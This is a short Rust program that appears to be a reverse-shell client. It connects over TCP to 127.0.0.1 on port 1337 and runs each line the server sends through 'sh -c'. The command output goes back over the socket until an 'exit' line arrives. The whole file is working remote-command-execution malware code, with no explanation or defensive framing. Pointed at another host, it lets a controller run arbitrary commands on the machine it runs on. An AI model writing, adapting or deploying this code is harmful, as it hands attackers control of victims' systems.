use core::panic;
use std::{io::{BufRead, BufReader, Write}};
use std::io::BufWriter;
use std::str;
use std::net::{TcpStream, Shutdown};
use std::process::Command;


fn send_line(line:&mut String, stream: &TcpStream){
    let mut writer = BufWriter::new(stream);
    writer.write_all(line.as_bytes()).expect("failed to send message");
    drop(writer);
}


fn main() {
    if let Ok(stream) = TcpStream::connect("127.0.0.1:1337"){
        println!("connected!");
        let mut mesg: String = "Hello\n".to_string();
        send_line(&mut mesg, &stream);
        send_line(&mut "END OF BUFFER\n".to_string(), &stream);
        println!("sent hello");
        let loopize = true;
        while loopize {
            let mut response= String::new();
            let mut reader = BufReader::new(&stream);
            reader.read_line(&mut response).expect("error reading line");
            println!("{}",response);
            if response.contains("exit"){
                stream.shutdown(Shutdown::Both).expect("error shutting down");
                break;   
            }
            println!("command line: sh -c {}", response);
            let command_response = Command::new("sh").arg("-c").arg(response.to_string()).output().unwrap().stdout;
            let stdout_string = match str::from_utf8(&command_response){
                Ok(v) => v,
                Err(e) => panic!("Invalid UTF-8 sequence: {}", e)
            };
            let command_lines_split = stdout_string.split("\n");
            let command_lines_vec = command_lines_split.collect::<Vec<&str>>();
            for line in command_lines_vec{
                let mut full_line = format!("{}\n",line.to_string());
                send_line(&mut full_line, &stream);
            }
            send_line(&mut "END OF BUFFER\n".to_string(), &stream);
            drop(response);
            drop(reader);
        }
    }
}
